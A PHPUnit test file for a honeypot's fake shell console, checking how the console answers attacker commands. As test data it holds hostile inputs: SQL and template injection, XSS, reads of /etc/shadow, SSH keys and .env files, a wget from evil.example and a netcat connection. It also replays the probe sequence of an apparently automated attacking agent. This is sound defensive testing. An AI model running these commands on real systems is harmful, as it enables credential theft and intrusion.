<?php

declare(strict_types=1);

namespace Funnypot\Tests\App\Http;

use Funnypot\App\Http\LabyrinthController;
use Funnypot\App\Tarpit\Cmdi\AshVocabulary;
use Funnypot\App\Tarpit\Cmdi\FootholdIdentity;
use Funnypot\App\Tarpit\Cmdi\Outcome;
use Funnypot\App\Tarpit\Cmdi\OutcomePicker;
use Funnypot\App\Tarpit\Cmdi\ShellLexer;
use Funnypot\App\Tarpit\Cmdi\AdaptiveShell;
use Funnypot\App\Tarpit\LlmOnlyLink;
use Funnypot\Core\Attack\CannedData;
use Funnypot\Core\RequestContext;
use Funnypot\Tests\App\Identity\IdentityTestSupport;
use Funnypot\Tests\App\Tarpit\Cmdi\ConsoleHarness;
use Funnypot\Tests\App\Tarpit\Cmdi\SpyCmdiStore;
use PDO;
use PHPUnit\Framework\TestCase;

/**
 * The console through the real request pipeline: the installed engine, HoneypotController::handle(),
 * the foothold rewriter and a spy store, under the default catalog and the lab catalog.
 */
final class AdaptiveShellHandleTest extends TestCase
{
    /**
     * The engine's first-match winner per console payload, derived from the installed matcher with
     * rawurlencode() bytes (POST body on /admin/root/post, query on /admin/root/html). A core bump that
     * changes a row fails here with a diff instead of silently changing who answers.
     *
     * payload => [default POST, default GET, lab POST, lab GET]
     */
    private const TABLE = [
        'psql -c "select * from information_schema.tables"' => ['attack-sqli', 'attack-sqli', 'attack-sqli', 'attack-sqli'],
        "mysql -e 'select 1 union select 2'" => ['attack-sqli', 'attack-sqli', 'attack-sqli', 'attack-sqli'],
        "grep -r 'DB_' --include=*.env /var/www" => ['attack-sqli', 'attack-sqli', 'attack-sqli', 'attack-sqli'],
        "php -r 'sleep(5);'" => ['attack-sqli', 'attack-sqli', 'attack-sqli', 'attack-sqli'],
        'echo ${7*7}' => ['attack-ssti-numeric', 'attack-ssti-numeric', 'attack-ssti-numeric', 'attack-ssti-numeric'],
        'echo {{7*7}}' => ['attack-ssti-numeric', 'attack-ssti-numeric', 'attack-ssti-numeric', 'attack-ssti-numeric'],
        "echo {{7*'7'}}" => ['attack-ssti-twig', 'attack-ssti-twig', 'attack-ssti-twig', 'attack-ssti-twig'],
        "echo [php]system('id')" => ['attack-php-glastopf', 'attack-php-glastopf', 'attack-php-glastopf', 'attack-php-glastopf'],
        "echo '<script>alert(1)</script>' > /var/www/html/x.html" => ['attack-xss', 'attack-xss', 'attack-xss', 'attack-xss'],
        'cat /etc/shadow' => ['attack-lfi-shadow', 'attack-lfi-shadow', 'attack-lfi-shadow', 'attack-lfi-shadow'],
        'cat /etc/shadow-' => ['attack-lfi-shadow', 'attack-lfi-shadow', 'attack-lfi-shadow', 'attack-lfi-shadow'],
        'ls /etc/shadow.bak' => ['attack-lfi-shadow', 'attack-lfi-shadow', 'attack-lfi-shadow', 'attack-lfi-shadow'],
        'cat /etc/passwd-' => ['attack-lfi-unix', 'attack-lfi-unix', 'attack-lfi-unix', 'attack-lfi-unix'],
        'cat /tmp/x/etc/passwd' => ['attack-lfi-unix', 'attack-lfi-unix', 'attack-lfi-unix', 'attack-lfi-unix'],
        'cat /proc/self/environ.1' => ['attack-lfi-environ', 'attack-lfi-environ', 'attack-lfi-environ', 'attack-lfi-environ'],
        'echo FPCANARY7Q union select 1' => ['attack-sqli', 'attack-sqli', 'attack-sqli', 'attack-sqli'],
        'ls; id' => ['attack-cmdi-unix', 'attack-cmdi-unix', 'attack-webshell-panel', 'attack-webshell-panel'],
        'ls | cat' => ['attack-webshell-panel', 'attack-cmdi-unix', 'attack-webshell-panel', 'attack-webshell-panel'],
        'id' => ['attack-webshell-panel', 'attack-webshell-panel', 'attack-webshell-panel', 'attack-webshell-panel'],
        'echo HELLO' => ['attack-webshell-panel', 'attack-webshell-panel', 'attack-webshell-panel', 'attack-webshell-panel'],
    ];

    /** The task-#12 bodies, in order, as the agent sent them (literal, unencoded). */
    private const TASK12 = [
        'csrf=a3f9c1e7&cmd=id', 'csrf=a3f9c1e7&cmd=id', 'csrf=a3f9c1e7&cmd=cat /etc/hosts', 'csrf=a3f9c1e7&cmd=cat /etc/hosts',
        'csrf=a3f9c1e7&cmd=ls -R /var/www/bexworth/public', 'csrf=a3f9c1e7&cmd=ls; id', 'csrf=a3f9c1e7&cmd=ls | cat',
        'csrf=a3f9c1e7&cmd=hostname', 'csrf=a3f9c1e7&cmd=hostname', 'csrf=a3f9c1e7&cmd=whoami', 'csrf=a3f9c1e7&cmd=echo HELLO',
        'csrf=a3f9c1e7&cmd=which python3 psql', 'csrf=a3f9c1e7&cmd=ls', 'csrf=a3f9c1e7&cmd=echo TEST', 'cmd=env', 'cmd=env',
        'cmd=ls -a /app/.env', 'cmd=cat /app/.env', 'cmd=ls -F /app', 'cmd=pwd', 'cmd=echo hello', 'cmd=ls', 'cmd=nonexistentcommand',
    ];

    /** Bytes that only appear when a core body slipped through. */
    private const CORE_MARKERS = ['You have an error in your SQL syntax', 'Search results', 'Welcome.', '7777777', 'uid=0(root) gid=0(root) groups=0(root)'];

    /** @var list<ConsoleHarness> */
    private array $harnesses = [];

    protected function setUp(): void
    {
        if (!extension_loaded('pdo_sqlite')) {
            self::markTestSkipped('ext-pdo_sqlite not loaded');
        }
    }

    protected function tearDown(): void
    {
        foreach ($this->harnesses as $h) {
            $h->cleanup();
        }
        $this->harnesses = [];
    }

    /** @param array<string,mixed> $o */
    private function harness(array $o = [], ?array &$sleeps = null): ConsoleHarness
    {
        return $this->harnesses[] = ConsoleHarness::build($o, $sleeps);
    }

    private static function pre(string $body): ?string
    {
        return preg_match('~<pre>(.*)</pre>~s', $body, $m) === 1 ? $m[1] : null;
    }

    /** The decoded text of the console <pre> (what the attacker reads). */
    private static function text(string $body): string
    {
        return html_entity_decode((string) self::pre($body), ENT_QUOTES, 'UTF-8');
    }

    private static function header(string $body): string
    {
        return (string) strstr($body, '<pre>', true);
    }

    private static function assertShell(string $body, string $why): void
    {
        self::assertStringContainsString('<title>Shell</title>', $body, $why);
        self::assertNotNull(self::pre($body), $why);
        self::assertStringContainsString(LabyrinthController::entryHint(), $body, "{$why}: onward pointer");
        self::assertFalse(LlmOnlyLink::containsFollowableLink($body), "{$why}: no followable link");
    }

    private static function assertNoCoreBody(string $body, string $payload, string $why): void
    {
        foreach (self::CORE_MARKERS as $m) {
            self::assertStringNotContainsString($m, $body, "{$why}: core marker {$m}");
        }
        $text = self::text($body);
        self::assertStringNotContainsString('$6$', $text, "{$why}: no shadow hash for www-data");
        self::assertNotSame("49\n\$ ", $text, "{$why}: no rendered template arithmetic");
        if ($payload !== 'cat /etc/passwd') {
            self::assertStringNotContainsString('root:x:0:0', $text, "{$why}: no passwd outside a passwd turn");
        }
        if (!str_contains($payload, 'environ') && !str_starts_with($payload, 'env')) {
            self::assertStringNotContainsString('USER=', $text, "{$why}: no environ outside an environ turn");
        }
    }

    // --- 1. ownership -------------------------------------------------------------------------

    public function test_the_pinned_ownership_table_is_the_installed_matchers_answer(): void
    {
        $derived = [];
        foreach (array_keys(self::TABLE) as $p) {
            $row = [];
            foreach ([[], ConsoleHarness::LAB_OFF] as $off) {
                $row[] = ConsoleHarness::winner(new RequestContext('POST', '/admin/root/post', '', ['Content-Type' => 'application/x-www-form-urlencoded'], ConsoleHarness::form($p, 'pct20')), $off);
                $row[] = ConsoleHarness::winner(new RequestContext('GET', '/admin/root/html', 'cmd=' . rawurlencode($p)), $off);
            }
            $derived[$p] = $row;
        }
        self::assertSame(self::TABLE, $derived);
    }

    /** @return array<string,array{0:string}> */
    public static function catalogs(): array
    {
        return ['default catalog' => ['default'], 'lab catalog' => ['lab']];
    }

    /** @dataProvider catalogs */
    public function test_the_console_owns_every_cmd_payload_whatever_rule_wins(string $catalog): void
    {
        $h = $this->harness(['catalog' => $catalog]);
        $off = $catalog === 'lab' ? ConsoleHarness::LAB_OFF : [];
        $n = 0;
        foreach (array_keys(self::TABLE) as $p) {
            $bodies = [];
            foreach (['literal', 'plus', 'pct20'] as $enc) {
                $ip = '198.51.' . (100 + intdiv($n, 250)) . '.' . (1 + $n % 250);
                $n++;
                $form = ConsoleHarness::form($p, $enc);
                $r = $h->fetch('POST', '/admin/root/post', '', $form, $ip);
                $why = "{$catalog} {$enc} {$p}";
                self::assertShell($r['body'], $why);
                self::assertNoCoreBody($r['body'], $p, $why);
                $expected = ConsoleHarness::winner(new RequestContext('POST', '/admin/root/post', '', ['Content-Type' => 'application/x-www-form-urlencoded'], $form), $off);
                self::assertSame([$expected], array_slice((array) $r['row']['templates'], 0, 1), "{$why}: the log keeps what the engine matched");
                $bodies[$enc] = $r['body'];
            }
            self::assertSame($bodies['literal'], $bodies['plus'], "{$p}: + and literal bodies match");
            self::assertSame($bodies['literal'], $bodies['pct20'], "{$p}: %20 and literal bodies match");

            $r = $h->fetch('POST', '/uploads/shell.php', '', ConsoleHarness::form($p, 'pct20'), '203.0.' . (113 + intdiv($n, 250)) . '.' . (1 + $n % 250));
            $n++;
            self::assertShell($r['body'], "{$catalog} shell.php {$p}");
            self::assertNoCoreBody($r['body'], $p, "{$catalog} shell.php {$p}");

            $r = $h->fetch('GET', '/admin/root/html', 'cmd=' . rawurlencode($p), null, '192.0.2.' . (1 + $n % 250));
            $n++;
            self::assertShell($r['body'], "{$catalog} GET {$p}");
            self::assertNoCoreBody($r['body'], $p, "{$catalog} GET {$p}");
        }
    }

    /** @dataProvider catalogs */
    public function test_a_path_the_shell_answered_becomes_a_console(string $catalog): void
    {
        $h = $this->harness(['catalog' => $catalog]);
        $psql = 'psql -c "select * from information_schema.tables"';
        $first = $h->post('/upload.php', $psql, '198.51.100.70', 'pct20');
        self::assertStringContainsString('You have an error in your SQL syntax', $first['body'], 'recorded residual: the first SQL-shaped turn on a fresh path keeps its SQL fake');

        $id = $h->post('/upload.php', 'id', '198.51.100.70');
        self::assertShell($id['body'], 'Rule B: the webshell answer is owned');
        self::assertSame(['attack-webshell-panel'], (array) $id['row']['templates']);

        $again = $h->post('/upload.php', $psql, '198.51.100.70', 'pct20');
        self::assertShell($again['body'], 'the path is now a console for this source');
        self::assertNoCoreBody($again['body'], $psql, 'sticky console');
        self::assertSame(['attack-sqli'], (array) $again['row']['templates'], 'the log still says what the engine matched');

        $other = $h->post('/upload.php', $psql, '198.51.100.71', 'pct20');
        self::assertStringContainsString('You have an error in your SQL syntax', $other['body'], 'sticky is per source');
    }

    // --- 2. the task-#12 replay ------------------------------------------------------------------

    public function test_the_live_agent_probe_sequence_reads_as_a_real_shell(): void
    {
        $h = $this->harness();
        $ip = '198.51.100.12';
        $text = [];
        $bodies = [];
        foreach (self::TASK12 as $i => $form) {
            $r = $h->fetch('POST', '/admin/root/post', '', $form, $ip);
            self::assertShell($r['body'], $form);
            parse_str($form, $v);
            $text[$i] = [$v['cmd'], self::text($r['body'])];
            $bodies[$i] = $r['body'];
        }
        $by = [];
        foreach ($text as [$cmd, $t]) {
            $by[$cmd] ??= $t;
        }
        $recon = [$by['id'], $by['whoami'], $by['hostname'], $by['pwd'], $by['env']];
        self::assertSame($recon, array_values(array_unique($recon)), 'id/whoami/hostname/pwd/env differ');
        self::assertStringContainsString('uid=33(www-data)', $by['id']);
        self::assertSame("HELLO\n\$ ", $by['echo HELLO']);
        self::assertSame("TEST\n\$ ", $by['echo TEST']);
        self::assertSame("sh: nonexistentcommand: not found\n\$ ", $by['nonexistentcommand']);
        self::assertStringContainsString("cat: can't open '/app/.env': No such file or directory", $by['cat /app/.env']);
        self::assertSame('$ ', self::text($bodies[11]), 'which prints nothing for absent tools');
        $landing = $h->rewriter->landing(FootholdIdentity::www());
        foreach ([5, 6] as $i) {
            self::assertNotSame($landing, $bodies[$i], "{$text[$i][0]}: never the landing");
        }
        self::assertSame($bodies[2], $bodies[3], 'the same cat /etc/hosts twice is byte-identical');
        self::assertSame($bodies[0], $bodies[1]);
    }

    // --- 3. identity ---------------------------------------------------------------------------

    public function test_every_answer_agrees_with_the_source_identity(): void
    {
        foreach (['root', 'www-data'] as $pin) {
            $h = $this->harness(['pin' => $pin]);
            $id = $pin === 'root' ? FootholdIdentity::root() : FootholdIdentity::www();
            $ip = '198.51.100.33';
            $t = static fn (string $cmd): string => self::text($h->post('/admin/root/post', $cmd, $ip)['body']);
            self::assertSame($id->idLine() . "\n\$ ", $t('id'));
            self::assertSame($id->name . "\n\$ ", $t('whoami'));
            $environ = $t('cat /proc/self/environ');
            self::assertStringContainsString("USER={$id->name}", $environ);
            self::assertStringContainsString("HOME={$id->home}", $environ);
            $header = self::header($h->post('/admin/root/post', 'id', $ip)['body']);
            if ($pin === 'root') {
                self::assertSame(CannedData::SHADOW . '$ ', $t('cat /etc/shadow'), 'root reads core\'s inert shadow, byte for byte');
                self::assertSame(".\n..\n\$ ", $t('ls -a /root'));
                self::assertStringNotContainsString('<b>user:</b>', $header);
            } else {
                self::assertStringContainsString('Permission denied', $t('cat /etc/shadow'));
                self::assertStringContainsString('Permission denied', $t('ls -a /root'));
                self::assertStringContainsString('<b>user:</b> ' . $id->idLine() . '<br>', $header);
            }
        }

        $h = $this->harness(['pin' => 'auto']);
        $byName = [];
        for ($i = 1; $i < 255 && count($byName) < 2; $i++) {
            $byName[$h->shell->identityFor("203.0.113.{$i}")->name] ??= "203.0.113.{$i}";
        }
        self::assertCount(2, $byName);
        $headers = [];
        foreach ($byName as $name => $ip) {
            $a = self::header($h->post('/admin/root/post', 'id', $ip)['body']);
            $b = self::header($h->post('/admin/root/post', 'echo hi', $ip)['body']);
            self::assertSame($a, $b, "{$name}: one header for every request from a source");
            $headers[] = $a;
        }
        self::assertNotSame($headers[0], $headers[1], 'sources drawn to different identities see different headers');
    }

    // --- 4. reflection ---------------------------------------------------------------------------

    public function test_nothing_from_a_get_or_a_query_string_is_ever_echoed(): void
    {
        foreach (['www-data', 'root'] as $pin) {
            $h = $this->harness(['pin' => $pin]);
            $n = 0;
            $check = function (array $r, string $why) use ($h, &$n): void {
                $ip = '198.51.100.' . (150 + $n);
                $identity = $h->shell->identityFor($ip);
                self::assertStringNotContainsStringIgnoringCase('fpcanary7q', $r['body'], $why);
                self::assertStringNotContainsString('$6$', $r['body'], "{$why}: the landing never shows shadow");
                foreach (self::CORE_MARKERS as $m) {
                    self::assertStringNotContainsString($m, $r['body'], $why);
                }
                self::assertSame($h->rewriter->landing($identity), $r['body'], "{$why}: the identity-aware landing");
            };
            foreach (['echo%20FPCANARY7Q', 'FPCANARY7Q', 'cat%20/FPCANARY7Q'] as $q) {
                $ip = '198.51.100.' . (150 + $n);
                $check($h->fetch('GET', '/admin/root/post', "cmd={$q}", null, $ip), "GET cmd={$q}");
                $n++;
            }
            $ip = '198.51.100.' . (150 + $n);
            $check($h->fetch('POST', '/admin/root/post', 'cmd=echo%20FPCANARY7Q', 'csrf=a3f9c1e7&q=1', $ip), 'POST with the canary in the query');
            $n++;
            foreach (['/admin/root/html', '/admin/root/link'] as $path) {
                foreach (['cat /etc/shadow-', 'ls /etc/shadow.bak', 'cat /etc/passwd-', 'cat /tmp/x/etc/passwd', 'cat /proc/self/environ.1', 'echo FPCANARY7Q union select 1'] as $cmd) {
                    $ip = '198.51.100.' . (150 + $n);
                    $check($h->fetch('GET', $path, 'cmd=' . rawurlencode($cmd), null, $ip), "GET {$path} {$cmd}");
                    $n++;
                }
            }
        }
    }

    public function test_a_body_value_is_echoed_safely_and_capped(): void
    {
        $h = $this->harness();
        self::assertSame("FPCANARY7Q\n\$ ", self::text($h->post('/admin/root/post', 'echo FPCANARY7Q', '198.51.100.40')['body']), 'positive control');

        $tags = $h->post('/admin/root/post', 'echo <b>x</b>', '198.51.100.41')['body'];
        self::assertStringNotContainsString('<b>x', (string) self::pre($tags), 'no raw markup inside the console');
        self::assertStringNotContainsString('</b>', (string) self::pre($tags));

        $long = self::text($h->post('/admin/root/post', 'echo ' . str_repeat('A', 300), '198.51.100.42')['body']);
        self::assertStringContainsString(str_repeat('A', 256), $long);
        self::assertStringNotContainsString(str_repeat('A', 257), $long);

        $forms = ["echo 'C%dQ' | cat", 'id; echo C%dQ', 'echo "C%dQ" && id', 'echo $(echo C%dQ)', 'echo `echo C%dQ`', "echo C%dQ > /tmp/C%dQ",
            'cat /etc/C%dQ; id', "echo 'C%dQ'; echo \"C%dQ\"", 'echo C%dQ | base64', 'ls /C%dQ || id'];
        for ($i = 0; $i < 50; $i++) {
            $canary = 'FPRAW' . (1000 + $i);
            $cmd = str_replace('C%dQ', $canary, $forms[$i % count($forms)]);
            $body = $h->post('/admin/root/post', $cmd, '198.51.101.' . (1 + $i))['body'];
            self::assertStringNotContainsString($cmd, $body, "the full command is never echoed: {$cmd}");
            self::assertStringNotContainsString($cmd, html_entity_decode($body, ENT_QUOTES, 'UTF-8'), "not even escaped: {$cmd}");
        }
    }

    // --- 5. stand-downs ------------------------------------------------------------------------

    public function test_stand_downs_and_fallbacks(): void
    {
        foreach (['www-data', 'root'] as $pin) {
            $h = $this->harness(['pin' => $pin]);
            $ip = '198.51.100.60';
            $landing = $h->fetch('GET', '/uploads/shell.php', '', null, $ip)['body'];
            self::assertSame($h->rewriter->landing($h->shell->identityFor($ip)), $landing, "{$pin}: no cmd, the identity-aware landing");
            if ($pin === 'root') {
                self::assertStringNotContainsString('uid=', $landing, 'root is not revealed unprompted');
            } else {
                self::assertStringContainsString('uid=33(www-data)', $landing);
            }
        }

        $core = $this->harness(['shell' => false, 'env' => ['FUNNYPOT_TARPIT' => '0']]);
        $coreJs = $core->fetch('GET', '/x.js', 'cmd=id', null, '198.51.100.61')['body'];
        self::assertStringContainsString('Linux web01', $coreJs, 'sanity: the engine body');
        self::assertSame($coreJs, $this->harness()->fetch('GET', '/x.js', 'cmd=id', null, '198.51.100.61')['body'], 'static asset: neither rewriter runs');
        self::assertSame($coreJs, $this->harness(['env' => ['FUNNYPOT_TARPIT' => '0']])->fetch('GET', '/uploads/shell.php', 'cmd=id', null, '198.51.100.62')['body'], 'tarpit off: the engine body');

        $off = $this->harness(['env' => ['FUNNYPOT_TARPIT_CMDI_SYNTAX' => '0']]);
        $base = $this->harness(['shell' => false]);
        foreach ([['POST', '/admin/root/post', '', ConsoleHarness::form('id')], ['POST', '/admin/root/post', '', ConsoleHarness::form('ls; id')], ['GET', '/uploads/shell.php', 'cmd=id', null], ['GET', '/uploads/shell.php', '', null]] as [$m, $p, $q, $b]) {
            self::assertSame($base->fetch($m, $p, $q, $b, '198.51.100.63')['body'], $off->fetch($m, $p, $q, $b, '198.51.100.63')['body'], "console flag off = the static foothold: {$m} {$p} {$q}{$b}");
        }
        self::assertSame([], $off->store->writes);

        foreach ([false, true] as $llm) {
            $with = $this->harness(['llm' => $llm])->fetch('GET', '/admin/root/html', '', null, '198.51.100.64')['body'];
            $without = $this->harness(['llm' => $llm, 'shell' => false])->fetch('GET', '/admin/root/html', '', null, '198.51.100.64')['body'];
            self::assertSame($without, $with, 'a bare GET of the lure is unchanged, llm ' . ($llm ? 'on' : 'off'));
            self::assertStringNotContainsString('<title>Shell</title>', $with);
        }
    }

    public function test_a_resent_write_names_the_file_it_targets_now(): void
    {
        $h = $this->harness();
        $ip = '198.51.100.31';
        $found = null;
        for ($i = 0; $i < 400 && $found === null; $i++) {
            $cmd = 'echo x' . str_repeat(';id', $i % 40) . str_repeat('|cat', intdiv($i, 40)) . " > /tmp/first{$i}";
            if (str_contains(self::text($h->post('/admin/root/post', $cmd, $ip)['body']), "can't create /tmp/first{$i}: Read-only file system")) {
                $found = [$i, $cmd];
            }
        }
        self::assertNotNull($found, 'sanity: some shape is answered with a read-only write failure');
        [$i, $cmd] = $found;
        foreach (['/var/tmp/SECONDtarget', '/dev/shm/x', '/tmp/third'] as $target) {
            $retarget = str_replace("/tmp/first{$i}", $target, $cmd);
            self::assertSame(
                "sh: can't create {$target}: Read-only file system\n\$ ",
                self::text($h->post('/admin/root/post', $retarget, $ip)['body']),
                'the same shape replays the same failure, naming the current target'
            );
        }
        self::assertSame($h->rewriter->landing(FootholdIdentity::www()), $h->fetch('GET', '/admin/root/html', 'cmd=' . rawurlencode($cmd), null, $ip)['body'], 'a GET never names its target');
        foreach ($h->store->states[$ip]->memo as $d) {
            self::assertStringNotContainsString('/tmp', json_encode($d), 'nothing from the line is stored');
        }
    }

    public function test_a_sleep_forced_answer_does_not_rewrite_the_shapes_answer(): void
    {
        foreach (['ls | cat', "echo 'a'", 'id && id', 'echo "x"', 'echo `id`', 'id > /tmp/x', '(id)', 'echo $(id)', 'id || id', 'echo $HOME', 'cat /etc/hosts | head', 'id 2>&1'] as $k => $primer) {
            $h = $this->harness();
            $ip = '198.51.100.' . (110 + $k);
            $h->post('/admin/root/post', $primer, $ip);
            $first = self::text($h->post('/admin/root/post', 'ls; id', $ip)['body']);
            if ((end($h->store->writes)['sub'] ?? '') !== 'first') {
                continue;
            }
            $slept = self::text($h->post('/admin/root/post', 'sleep 1; id', $ip)['body']);
            self::assertSame('all', end($h->store->writes)['sub'], 'sanity: the sleep turn ran every segment');
            self::assertSame(FootholdIdentity::www()->idLine() . "\n\$ ", $slept);
            self::assertSame($first, self::text($h->post('/admin/root/post', 'ls; id', $ip)['body']), 'a resend of the shape answers as it did before the sleep');

            return;
        }
        self::fail('no primer left `ls; id` as a first-segment accept');
    }

    public function test_plain_expansions_answer_from_the_box_environment(): void
    {
        foreach (['www-data' => '/var/www', 'root' => '/root'] as $pin => $home) {
            $h = $this->harness(['pin' => $pin, 'env' => ['FUNNYPOT_JITTER_MS' => '0']]);
            foreach (['echo $PATH', 'echo $HOME', 'cat $HOME/.profile', 'echo ${PATH}', 'echo $USER'] as $i => $cmd) {
                $t = self::text($h->post('/admin/root/post', $cmd, '203.0.113.' . (10 + $i), 'pct20')['body']);
                self::assertStringNotContainsString('bad substitution', $t, "{$cmd}: ash never says this for a plain expansion");
            }
            for ($i = 0; $i < 40; $i++) {
                self::assertSame("/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n\$ ", self::text($h->post('/admin/root/post', 'echo $PATH', '198.18.' . $i . '.9', 'pct20')['body']), 'every fresh source: the value env prints');
            }
            self::assertSame("{$home}\n\$ ", self::text($h->post('/admin/root/post', 'echo $HOME', '203.0.113.90', 'pct20')['body']));
            self::assertSame("sh: syntax error: bad substitution\n\$ ", self::text($h->post('/admin/root/post', 'echo ${7*7}', '203.0.113.91', 'pct20')['body']), 'a malformed ${…} is the real, deterministic error');
        }
    }

    public function test_a_get_never_carries_bytes_from_its_arguments(): void
    {
        $h = $this->harness(['env' => ['FUNNYPOT_JITTER_MS' => '0']]);
        $cut = self::text($h->fetch('GET', '/admin/root/html', 'cmd=' . rawurlencode('cut -dQ -f1,1 /etc/hostname'), null, '203.0.113.60')['body']);
        self::assertStringNotContainsString('Q', $cut, 'the GET-supplied delimiter byte');
        $kill = self::text($h->fetch('GET', '/admin/root/html', 'cmd=' . rawurlencode('kill 31337424242'), null, '203.0.113.61')['body']);
        self::assertStringNotContainsString('31337424242', $kill, 'GET-supplied digits');

        $n = 0;
        $shapes = ['%s FPCANARYQ7', '%s -dFPCANARYQ7 -f1,1 /etc/hostname', '%s 31337424242', '%s /FPCANARYQ7', '%s -n 31337424242 /etc/passwd',
            '%s${IFS}FPCANARYQ7', '%s${IFS}0000031337424242', '%s$IFS -d- -f1,3 /etc/hostname'];
        foreach (array_merge(\Funnypot\App\Tarpit\Cmdi\FootholdFacts::commandNames(), \Funnypot\App\Tarpit\Cmdi\FootholdFacts::BUILTINS) as $applet) {
            foreach ($shapes as $shape) {
                $cmd = sprintf($shape, $applet);
                $body = $h->fetch('GET', '/admin/root/html', 'cmd=' . rawurlencode($cmd), null, '10.77.' . intdiv($n, 250) . '.' . ($n % 250))['body'];
                $n++;
                self::assertStringNotContainsStringIgnoringCase('fpcanaryq7', $body, "GET {$cmd}");
                self::assertStringNotContainsString('31337424242', $body, "GET {$cmd}");
            }
        }
        self::assertGreaterThan(1000, $n, 'every applet and builtin was swept');
    }

    public function test_one_turn_stays_cheap_whatever_the_line_asks(): void
    {
        $h = $this->harness(['env' => ['FUNNYPOT_JITTER_MS' => '0']]);
        $fill = static function (string $head, string $operand): string {
            while (strlen($head) + strlen($operand) + 1 <= \Funnypot\App\Tarpit\Cmdi\ShellLexer::MAX_INPUT) {
                $head .= ' ' . $operand;
            }

            return $head;
        };
        $warnings = [];
        set_error_handler(static function (int $no, string $msg) use (&$warnings): bool {
            // The CLI cannot send headers once PHPUnit has printed; under php-fpm these never occur.
            if (!str_contains($msg, 'headers already sent')) {
                $warnings[] = $msg;
            }

            return true;
        });
        try {
            $joined = 'cat ';
            while (strlen($joined) + 5 <= \Funnypot\App\Tarpit\Cmdi\ShellLexer::MAX_INPUT) {
                $joined .= '$PATH';
            }
            foreach (['GET long $PATH path' => $joined] as $name => $line) {
                $h->fetch('GET', '/admin/root/html', 'cmd=id', null, '203.0.113.71');
                $t = hrtime(true);
                $body = $h->fetch('GET', '/admin/root/html', 'cmd=' . rawurlencode($line), null, '203.0.113.71')['body'];
                $ms = (hrtime(true) - $t) / 1e6;
                self::assertSame($h->rewriter->landing(FootholdIdentity::www()), $body, "{$name}: the attacker path is never shown on a GET");
                self::assertLessThan(100.0, $ms, sprintf('%s: one request took %.0f ms', $name, $ms));
            }
            foreach (['long $PATH path' => $joined, 'grep -r' => $fill('grep -r a', '/'), 'grep -rv' => $fill('grep -rv Q', '/'), 'find' => $fill('find', '/'),
                'find -name' => 'find / / / -name ' . str_repeat('a', 1100), 'du' => $fill('du -sh', '/'), 'all segments' => $fill('grep -r a /', ';grep -r a /')] as $name => $line) {
                $h->post('/admin/root/post', 'id', '203.0.113.70');
                memory_reset_peak_usage();
                $base = memory_get_usage();
                $t = hrtime(true);
                $body = $h->post('/admin/root/post', $line, '203.0.113.70', 'pct20')['body'];
                $ms = (hrtime(true) - $t) / 1e6;
                self::assertStringContainsString('<title>Shell</title>', $body, $name);
                self::assertLessThan(150.0, $ms, sprintf('%s: one request took %.0f ms', $name, $ms));
                self::assertLessThan(16 * 1048576, memory_get_peak_usage() - $base, "{$name}: peak memory");
            }
        } finally {
            restore_error_handler();
        }
        self::assertSame([], $warnings, 'no warning reaches the log');
    }

    // --- 6. the sleep decoy ----------------------------------------------------------------------

    /** A primer command that leaves the history in which $line gets an outcome of the wanted kind. */
    private static function primerFor(string $line, bool $accept): string
    {
        [$pick] = AdaptiveShell::keysFrom(IdentityTestSupport::httpIdentity()->filesystemKey());
        foreach (['ls | cat', "echo 'a'", 'id && id', 'echo "x"', 'echo `id`', 'id > /tmp/x', '(id)', 'echo $(id)', 'id || id', 'echo $HOME'] as $p) {
            $lex = ShellLexer::lex($p);
            $state = \Funnypot\App\Tarpit\Cmdi\SourceState::empty();
            $state = $state->after($lex, OutcomePicker::pick($lex, $state, $pick));
            if (OutcomePicker::pick(ShellLexer::lex($line), $state, $pick)->isAccept() === $accept) {
                return $p;
            }
        }
        self::fail("no primer gives {$line} an " . ($accept ? 'accept' : 'error'));
    }

    public function test_a_command_that_failed_to_parse_never_slept(): void
    {
        foreach ([false, true] as $accept) {
            $sleeps = [];
            $h = $this->harness([], $sleeps);
            $ip = $accept ? '198.51.100.81' : '198.51.100.80';
            $h->post('/admin/root/post', self::primerFor('id; sleep 3', $accept), $ip);
            $sleeps = [];
            $text = self::text($h->post('/admin/root/post', 'id; sleep 3', $ip)['body']);
            $row = end($h->store->writes);
            if ($accept) {
                self::assertNotSame([], $sleeps, 'it ran, so the delay is honoured');
                self::assertSame(FootholdIdentity::www()->idLine() . "\n\$ ", $text, 'and the body is id output');
                self::assertGreaterThan(0, $row['delay_ms']);
            } else {
                self::assertSame([], $sleeps, 'an error answer is never delayed');
                self::assertStringStartsWith('sh: syntax error', $text);
                self::assertSame(0, $row['delay_ms']);
            }
        }

        $sleeps = [];
        $h = $this->harness([], $sleeps);
        self::assertStringStartsWith('sh: syntax error: unexpected ";"', self::text($h->post('/admin/root/post', ';sleep 3', '198.51.100.82')['body']));
        self::assertSame([], $sleeps, 'a true defect never sleeps');

        $sleeps = [];
        $plain = self::text($h->post('/admin/root/post', 'sleep 3', '198.51.100.83')['body']);
        self::assertNotSame([], $sleeps, 'a bare sleep N (no metacharacter) is honoured too');
        self::assertGreaterThan(0, $sleeps[0]);
        self::assertSame('$ ', $plain, 'and prints the empty prompt');
    }

    // --- 7. never a 500 --------------------------------------------------------------------------

    public function test_faults_degrade_to_a_page_never_an_error(): void
    {
        $spy = new SpyCmdiStore();
        $spy->throw = true;
        $h = $this->harness(['store' => $spy]);
        $r = $h->post('/admin/root/post', 'id', '198.51.100.90');
        self::assertSame($h->rewriter->landing(FootholdIdentity::www()), $r['body'], 'a dead store falls back to the static foothold');

        $h = $this->harness();
        $big = $h->post('/admin/root/post', '$' . str_repeat('(', 65536), '198.51.100.91', 'pct20');
        self::assertShell($big['body'], 'a 64 KB nesting bomb');
        self::assertStringContainsString("sh: syntax error: missing '))'", self::text($big['body']));

        $h = $this->harness(['clock' => static function (): int {
            throw new \RuntimeException('clock fault');
        }]);
        self::assertSame($h->rewriter->landing(FootholdIdentity::www()), $h->post('/admin/root/post', 'uptime', '198.51.100.92')['body'], 'a facts fault falls back to the landing');
    }

    // --- 8/9. no goal-proof, always routes onward ------------------------------------------------

    public function test_no_body_is_goal_proof(): void
    {
        $bodies = [];
        foreach (['www-data', 'root'] as $pin) {
            $h = $this->harness(['pin' => $pin]);
            $i = 0;
            foreach (array_merge(array_keys(self::TABLE), ['cat /etc/shadow', 'cat /root/.ssh/id_rsa', 'env', 'cat /run/deploy/app.env', 'find /', 'ls -la /root',
                'wget http://evil.example/x.sh', 'nc 10.0.0.1 4444', 'touch /var/www/html/x.php', 'echo x > /var/www/html/x.php', 'apk add curl',
